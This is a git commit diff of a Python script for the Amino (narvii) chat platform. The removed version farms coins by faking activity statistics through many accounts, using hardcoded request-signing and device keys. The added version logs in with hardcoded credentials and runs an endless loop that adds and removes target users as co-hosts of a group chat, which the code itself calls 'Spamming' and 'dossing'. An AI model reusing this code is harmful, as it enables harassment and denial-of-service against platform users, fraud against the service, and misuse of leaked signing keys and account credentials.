51754ce514e1ecf3b41ffa81a4cc2f830c76ea56
samarjeet314 <85072188+samarjeet314@users.noreply.github.com>
2023-09-27 19:47:00 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,300 +1,210 @@
-import json
-import requests
-from time import time as timestamp
-from datetime import datetime
-from time import sleep
-import base64
-from json_minify import json_minify
-# from aminofix import objects
-from concurrent.futures import  ThreadPoolExecutor,ProcessPoolExecutor
-from binascii import hexlify
-from os import path
-import json
-import os
-from uuid import UUID
-import random
-import hmac
-from os import urandom
-from pytz import timezone
-from functools import reduce
-from base64 import b64decode, b64encode
-from typing import Union
+from concurrent.futures import ThreadPoolExecutor
+from requests import get
 from hashlib import sha1
-from hmac import new
-import sys
-#sys.stdin.reconfigure(encoding='utf-8')
-#sys.stdout.reconfigure(encoding='utf-8')
-from itertools import cycle
- 
+from os import path
+import json, time
+import aiohttp
+import asyncio 
+import base64
+import hmac
+
 THIS_FOLDER = path.dirname(path.abspath(__file__))
-account_file = path.join(THIS_FOLDER, "ids2.json")
-secrets=[]
- 
-with open(account_file) as file:
-    secrets = json.load(file)
- 
-import json
- 
- 
-PREFIX = bytes.fromhex("19")
-SIG_KEY = bytes.fromhex("DFA5ED192DDA6E88A12FE12130DC6206B1251E44")
-DEVICE_KEY = bytes.fromhex("E7309ECC0953C6FA60005B2765F99DBBC965C8E9")
-count=0
-links = [
-    "https://proxy69.vercel.app/proxy?url="
-]
- 
-comids=['205677143']
- 
-list_com=cycle(comids)
- 
-logins = cycle(links)
- 
-api="https://service.aminoapps.com/api/v1"
- 
-def get_com():
-    
-      return next(list_com)
- 
- 
-def get_total(sid):
-    try:
-        response = requests.get(f"{next(logins)}{api}/g/s/wallet", headers=get_headers(sid))
-        if response.status_code==200:
-                resp=json.loads(response.text)
-                coins=resp["wallet"]["totalCoins"]
-                return coins
-        elif response.status_code==403:
-                return get_total(sid)
-        else:
-                print(json.loads(response.text)["api:message"])
-                return 80
-    except requests.exceptions.ProxyError as e:
-            return get_total(sid)
-    
-def collect(sid,coins,em,chatId):
-    
-    try:
-        transactionId = str(UUID(hexlify(urandom(16)).decode('ascii')))
-        data = {
-                "coins": coins,
-                "tippingContext": {"transactionId": transactionId},
-                "timestamp": int(timestamp() * 1000)
-            }
-        
-        url = f"{next(logins)}{api}/g/s/chat/thread/{chatId}/tipping"
-        data = json.dumps(data)
-        response = requests.post(url, headers=get_headers(sid,data), data=data)
-        if response.status_code==200:
-                resp=json.loads(response.text)
-                if resp['api:message']=='OK':
-                        print(f'collected {coins}')
-        elif response.status_code==403:
-                return collect(sid,coins,em,chatId)
-        else:
-                print(json.loads(response.text)["api:message"])
-                return None
-    except requests.exceptions.ProxyError as e:
-             return collect(sid,coins,em,chatId)
- 
-def tzFilter(hour: int = 23, tz: str = None) -> int:
- 
-    zones = ["Etc/GMT" + (f"+{i}" if i > 0 else f"{i}") for i in range(-12, 12)]
- 
-    return next(
-        int(datetime.now(timezone(_)).strftime("%Z").replace("GMT", "00")) * 60
-        for _ in ([tz] if tz else zones)
-        if (tz or (int(datetime.now(timezone(_)).strftime("%H")) == hour))
-    )
- 
- 
-def gen_deviceId(data: bytes = None) -> str:
-    if isinstance(data, str):
-        data = bytes(data, 'utf-8')
-    identifier = PREFIX + (data or os.urandom(20))
-    mac = hmac.new(DEVICE_KEY, identifier, sha1)
-    return f"{identifier.hex()}{mac.hexdigest()}".upper()
- 
-def sig(data: Union[str, bytes]) -> str:
-    data = data if isinstance(data, bytes) else data.encode("utf-8")
-    signature = hmac.new(SIG_KEY, data, sha1)
-    return b64encode(PREFIX + signature.digest()).decode("utf-8")
- 
-def get_total(sid):
-    
-    response = requests.get(f"{next(logins)}{api}/g/s/wallet", headers=get_headers(sid))
-    if response.status_code==200:
-            resp=json.loads(response.text)
-            coins=resp["wallet"]["totalCoins"]
-            return coins
-    elif response.status_code==403:
-             get_total(sid)
-    else:
-            print(json.loads(response.text)["api:message"])
-            return 80
-    
-    
-    
- 
-def get_headers(sid=None,data=None):
-    headers={
-    'Accept-Language': 'en-US', 
-    'Content-Type': 'application/x-www-form-urlencoded', 
-    'User-Agent': 'Apple iPhone12,1 iOS v15.5 Main/3.12.2', 
-    #'Host': 'service.aminoapps.com', 
-    'Accept-Encoding': 'gzip',
-    'Connection': 'Upgrade',
-    'NDCDEVICEID':gen_deviceId()
-    }
-    if sid:
-        headers['NDCAUTH']=f"sid={sid}"
-    if data:
-        headers["NDC-MSG-SIG"]=sig(data)
-        headers["Content-Length"] = str(len(data))
-    return headers
- 
- 
-def collect(sid,coins,em,chatId):
-    
- 
-    transactionId = str(UUID(hexlify(urandom(16)).decode('ascii')))
-    data = {
-            "coins": coins,
-            "tippingContext": {"transactionId": transactionId},
-            "timestamp": int(timestamp() * 1000)
-        }
-    
-    url = f"{next(logins)}{api}/g/s/chat/thread/{chatId}/tipping"
-    data = json.dumps(data)
-    response = requests.post(url, headers=get_headers(sid,data), data=data)
-    if response.status_code==200:
-            resp=json.loads(response.text)
-            if resp['api:message']=='OK':
-                    print(f'collected {coins}')
-    elif response.status_code==403:
-             collect(sid,coins,em,chatId)
-    else:
-             print(json.loads(response.text)["api:message"])
-             return None
- 
-def login_custom(email: str, secret: str):
-        
+targets = path.join(THIS_FOLDER, 'Target.txt')
+with open(targets, 'r') as file:
+    targetlinks = file.read().splitlines()
+
+class FromLink:
+    def __init__(self, data):
+        self.json = data
+        self.objectType = None
+
+        self.objectId = None
+        self.comId = None
+
+    @property
+    def FromCode(self):
         try:
-            data = json.dumps({
-                "email": email,
-                # "phoneNumber":email,
-                "v": 2,
-                "secret":f"{secret}",
-                "deviceID":gen_deviceId(),
-                "clientType": 100,
-                "action": "normal",
-                "timestamp": int(timestamp() * 1000)
-            })
-            
-            
-            response = requests.post(f"{next(logins)}{api}/g/s/auth/login", headers=get_headers(data=data), data=data)
-            #print(response.text)
-            if response.status_code==200:
-                
-                return json.loads(response.text)["sid"]
-            elif response.status_code==403:
-                return login_custom(email,secret)
-            else:
-                print(response.text)
-                return None
-        except requests.exceptions.ProxyError as e:
-             print(e)
-             #return login_custom(email,secret)
- 
- 
- 
-#def join_com(sid,m,comId):
-        #try:
-            #data = {"timestamp": int(timestamp() * 1000)}
-            #data = json.dumps(data)
-            
-            #response = requests.post(f"{next(logins)}{api}/x{comId}/s/community/join", data=data, headers=get_headers(sid,data))
-            #if response.status_code==200:
-                #resp=json.loads(response.text)
-                #if resp['api:message']=='OK':
-                        #print(f'joined community: {m}')
-                        #return True
-                #else: return False
-            #elif response.status_code==403:
-                #return join_com(sid,m,comId)
-            #else:
-                #  print(json.loads(response.text)["api:message"])
-                 #return False
-                # comid.clear()
-                # comid.append("52193277")
-                # join_com(sid,comid[0])
-            
-        #except:
-              #return join_com(sid,m,comId)
- 
-#def leave_com(sid, m,comId):
-        
-        #response = requests.post(f"{next(logins)}{api}/x{comId}/s/community/leave", headers=get_headers(sid))
-        #if response.status_code != 200: 
-            #return True
-        #else:
-            # return leave_com(sid,m,comId)
- 
- 
-def magic_num():
-    timing = {"start": int(datetime.timestamp(datetime.now())), "end": int(datetime.timestamp(datetime.now())) + 300}
-    return timing
- 
- 
-def gen(sid,i,m,comId):
- try:
-    
-    chunk=[magic_num() for a in range(35)]
-    data = {"userActiveTimeChunkList": chunk,"timestamp": int(timestamp() * 1000),"optInAdsFlags": 2147483647,"timezone":190}
-    data = json_minify(json.dumps(data))
-    response = requests.post(f"{next(logins)}{api}/x{comId}/s/community/stats/user-active-time", headers=get_headers(sid,data), data=data)
-    if response.status_code==200:
-              
-              print(f'{json.loads(response.text)["api:message"]} {m} --- {i}')
-              #print(pp)
-    
-    else:
-             
-             print(json.loads(response.text)["api:message"])
-    return None
-    
-    
- except requests.exceptions.ProxyError as e:
-      gen(sid,i,m,comId)
-    
-def gen_1(account):
-        
-        # if put.find_one({"email":account['email']}) is None:
-                          
-            sid=login_custom(account['email'],account['secret'])
-            
-            if sid:
-                    
-                    # dict={"email":account['email'],"secret":account['secret']}
-                    # put.insert_one(dict)
-                    m=account['email']
-                    print(f"logged in {m}")
-                    id_com=get_com()
-                    
-                    
-                    #com=join_com(sid,m,id_com)
-                    #if com:
-                            
-                    for i in range(1,22,1):
-                                gen(sid,i,m,id_com)
-                                sleep(1)
-                            #leave_com(sid,m,id_com)
-            else:
+            self.path = self.json["path"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.objectType = self.json["extensions"]["linkInfo"]["objectType"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.objectId = self.json["extensions"]["linkInfo"]["objectId"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.comId = self.json["extensions"]["community"]["ndcId"]
+        except (KeyError, TypeError):
+            try:
+                self.comId = self.json["extensions"]["linkInfo"]["ndcId"]
+            except (KeyError, TypeError):
                 pass
-                
-        
- 
- 
- 
-for em in secrets:
-      gen_1(em)
+        return self
+
+
+class Account():
+    def __init__(self, accountline, session):
+        self.authenticated = False
+        self.email = accountline["email"]
+        self.password = accountline["password"]
+        self.device_id = accountline["device"]
+        self.session = session
+        self.target_user = []
+        self.hostgc = None
+        self.cid = None
+        self.sid = None
+        self.uid = None
+        self.api = 'https://service.narvii.com/api/v1'
+
+    async def generate_headers(self, data=None, content_type=None, sig=None):
+        headers = {
+            'NDCDEVICEID': self.device_id,
+            'Accept-Language': 'en-US',
+            'Content-Type': 'text/html',
+            'User-Agent':
+            'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/star2ltexx-user 7.1.; com.narvii.amino.master/3.4.33602)',
+            'Host': 'service.narvii.com',
+            'Accept-Encoding': 'gzip',
+            'Connection': 'Keep-Alive'
+        }
+        if data:
+            headers['content_type-Length'] = str(len(data))
+            if sig:
+                headers['NDC-MSG-SIG'] = sig
+        if self.sid:
+            headers['NDCAUTH'] = f'sid={self.sid}'
+        if content_type:
+            headers["Content-Type"] = content_type
+        return headers
+
+    async def sig(self, data):
+        signature = base64.b64encode(
+            bytes.fromhex("52") +
+            hmac.new(bytes.fromhex("EAB4F1B9E3340CD1631EDE3B587CC3EBEDF1AFA9"),
+                     data.encode("utf-8"), sha1).digest()).decode("utf-8")
+        return signature
+
+    async def login(self):
+        data = json.dumps({
+            'email': self.email,
+            'v': 2,
+            'secret': f'0 {self.password}',
+            'deviceID': self.device_id,
+            'clientType': 100,
+            'action': 'normal',
+            'timestamp': int(time.time() * 1000)
+        })
+        async with self.session.post(f'{self.api}/g/s/auth/login',
+                                     headers=await
+                                     self.generate_headers(data=data,
+                                                           sig=await
+                                                           self.sig(data)),
+                                     data=data) as response:
+            response = await response.json()
+            if response["api:statuscode"] == 0:
+                pass
+            else:
+                raise Exception(response['api:message'])
+            self.sid = response["sid"]
+            self.uid = response["account"]["uid"]
+            self.authenticated = True
+
+    async def from_link(self, link):
+        response = get(f"{self.api}/g/s/link-resolution?q={link}",
+                       headers=await self.generate_headers()).json()
+        if response["api:statuscode"] == 0:
+            pass
+        else:
+            raise Exception(response['api:message'])
+        x = FromLink(response["linkInfoV2"]).FromCode
+        if x.objectType == 12:
+            self.cid = x.comId
+            self.hostgc = x.objectId
+        else:
+            self.target_user.append(x.objectId)
+
+    async def set(self, uid):
+        data = json.dumps({
+            "uidList": [uid],
+            "timestamp": int(time.time() * 1000)
+        })
+        async with self.session.post(
+                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host",
+                data=data,
+                headers=await
+                self.generate_headers(data=data, sig=await
+                                      self.sig(data))) as _:
+            #response = await response.json()
+            #print(response)
+            #print(f"dossing {uid}")
+            pass
+            #if response["api:statuscode"] == 0:
+                 #pass
+            #else:
+                 #raise Exception(response["api:message"])
+
+    async def dele(self, uid):
+        async with self.session.delete(
+                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host/{uid}",
+                headers=await self.generate_headers()) as _:
+            #response = await response.json()
+            #print(response)
+            #(f"dossing {uid}")
+            pass
+            #if response["api:statuscode"] == 0:
+                 #pass
+            #else:
+                 #raise Exception(response["api:message"])
+
+    async def crash(self, uid):
+        try:
+            await self.set(uid)
+            await self.dele(uid)
+            print(f"Spamming {uid}")
+        except Exception as e:
+            print(f"error {e}")
+
+
+async def itachi(acc: Account):
+    crowd = []
+    xo = len(acc.target_user)
+    # for _ in range(10):
+    with ThreadPoolExecutor(max_workers= 50000) as exe:
+        _ = [
+            exe.submit(
+                crowd.append(
+                    asyncio.create_task(acc.crash(acc.target_user[i % xo]))))
+            for i in range(100)
+        ]
+    await asyncio.gather(*crowd)
+
+
+async def main():
+    
+    email="vecet52346@soremap.com" # enter email here
+    password="666666" # enter password here
+    device="194538E2978EA2F0656CAE3C92698A7D46DBA5543EDECA9CBA57F830BE27D90921F058DDE7D59871F3" # enter secret here
+    gclink="http://aminoapps.com/p/pmt2ny"  # enter gc link where you are set as host
+    logdata = {"email": email, "password": password, "device": device}
+    async with aiohttp.ClientSession() as session:
+        client = Account(logdata, session)
+        await client.login()
+        await client.from_link(gclink)
+        total = []
+        for targetlink in targetlinks:
+            total.append(asyncio.create_task(client.from_link(targetlink)))
+        await asyncio.gather(*total)
+        while True:
+             task = []
+             print(task)
+             await itachi(client)
+             for _ in range(100):
+                 for uid in client.target_user:
+                     task.append(asyncio.create_task(client.crash(uid)))
+             await asyncio.gather(*task)
+
+
+asyncio.get_event_loop().run_until_complete(main())
